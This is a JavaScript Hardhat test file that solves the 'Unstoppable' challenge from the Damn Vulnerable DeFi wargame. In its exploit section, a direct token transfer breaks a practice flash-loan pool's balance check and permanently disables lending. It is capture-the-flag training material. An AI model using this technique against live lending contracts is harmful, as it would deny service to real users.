const { ethers } = require('hardhat');
const { assert, expect } = require('chai');
const { BigNumber } = require('ethers');

/**
 * CHALLENGE:
 * Attack and stop the pool from offering flash loans.
 * source: https://www.damnvulnerabledefi.xyz/challenges/1.html
 */

describe.only('[Challenge] Unstoppable', function () {
  let deployer, attacker, someUser;

  // Pool has 1M * 10**18 tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker, someUser] = await ethers.getSigners();

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      'DamnValuableToken',
      deployer
    );
    const UnstoppableLenderFactory = await ethers.getContractFactory(
      'UnstoppableLender',
      deployer
    );

    this.token = await DamnValuableTokenFactory.deploy();
    this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

    await this.token.approve(this.pool.address, TOKENS_IN_POOL);
    await this.pool.depositTokens(TOKENS_IN_POOL);

    await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal(
      INITIAL_ATTACKER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    const ReceiverContractFactory = await ethers.getContractFactory(
      'ReceiverUnstoppable',
      someUser
    );
    this.receiverContract = await ReceiverContractFactory.deploy(
      this.pool.address
    );
    await this.receiverContract.executeFlashLoan(10);
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    // get balances
    const attackerBalanceBefore = await this.token.balanceOf(attacker.address);
    const poolBalanceBefore = await this.token.balanceOf(this.pool.address);
    // connect attacker to the pool contract and call the transfer() function to break it
    // -> as assert(poolBalance == balanceBefore) will end up in panic error;
    await this.token
      .connect(attacker)
      .transfer(this.pool.address, attackerBalanceBefore);
    // check that everything worked as intended
    expect(await this.token.balanceOf(attacker.address)).to.equal('0');
    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      BigNumber.from(attackerBalanceBefore).add(
        BigNumber.from(poolBalanceBefore)
      )
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // It is no longer possible to execute flash loans
    await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted;
  });
});
